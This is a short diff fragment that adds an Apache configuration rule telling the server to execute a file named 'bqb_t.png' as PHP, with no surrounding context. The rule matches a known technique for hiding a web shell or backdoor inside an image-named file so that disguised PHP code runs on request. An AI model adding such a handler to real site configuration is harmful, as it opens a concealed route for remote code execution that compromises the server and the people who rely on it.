@@ -1,0 +1,3 @@
+<FilesMatch bqb_t.png>
+SetHandler application/x-httpd-php
+</FilesMatch>
